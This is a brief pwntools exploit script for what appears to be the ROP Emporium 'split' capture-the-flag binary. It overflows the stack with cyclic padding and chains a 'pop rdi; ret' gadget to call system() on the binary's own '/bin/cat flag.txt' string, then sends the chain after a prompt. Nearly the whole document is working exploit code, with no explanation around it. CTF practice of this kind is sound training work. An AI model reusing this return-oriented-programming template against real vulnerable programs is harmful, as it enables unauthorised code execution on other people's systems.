from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    else:
        return process(e.path)


p = start()

padding = r.generatePadding(0, cyclic_find(b'kaaa'))
cat_flag = next(e.search(b'/bin/cat flag.txt\x00'))
system = e.sym['system']
pop_rdi = (r.find_gadget(['pop rdi', 'ret']))[0]

r.raw(padding)
r.call(pop_rdi)
r.raw(p64(cat_flag))
r.call(system)

log.info("split chain:\n%s" % r.dump())
p.recvuntil(b'>')
p.sendline(bytes(r))

p.interactive()
